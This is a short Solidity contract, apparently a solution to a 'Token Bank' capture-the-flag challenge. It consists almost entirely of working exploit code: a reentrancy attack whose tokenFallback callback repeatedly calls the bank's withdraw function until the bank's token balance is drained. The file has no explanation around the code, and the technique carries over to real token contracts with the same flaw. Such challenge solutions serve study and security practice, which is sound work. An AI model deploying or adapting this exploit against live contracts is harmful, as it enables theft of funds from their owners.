pragma solidity ^0.4.21;

interface ISimpleERC223Token {
    function balanceOf(address addr) returns (uint256);

    function transfer(address addr, uint256 amount) returns (uint256);
}

interface ITokenReceiver {
    function tokenFallback(
        address from,
        uint256 value,
        bytes data
    ) external;
}

interface ITokenBankChallenge {
    function token() external returns (ISimpleERC223Token);

    function withdraw(uint256 amount) external;
}

contract TokenBankChallengeSolver is ITokenReceiver {
    ITokenBankChallenge instance;
    ISimpleERC223Token token;
    bool reentrancyEnabled = false;

    constructor(address challenge) {
        instance = ITokenBankChallenge(challenge);
        token = instance.token();
    }

    // Callback
    function tokenFallback(
        address,
        uint256 value,
        bytes
    ) external {
        if (reentrancyEnabled && token.balanceOf(address(instance)) > 0) {
            instance.withdraw(value);
        }
    }

    function transferTokens(uint256 amount) public {
        reentrancyEnabled = false;
        token.transfer(address(instance), amount);
    }

    function solveChallenge(uint256 amount) public {
        reentrancyEnabled = true;
        instance.withdraw(amount);
    }
}
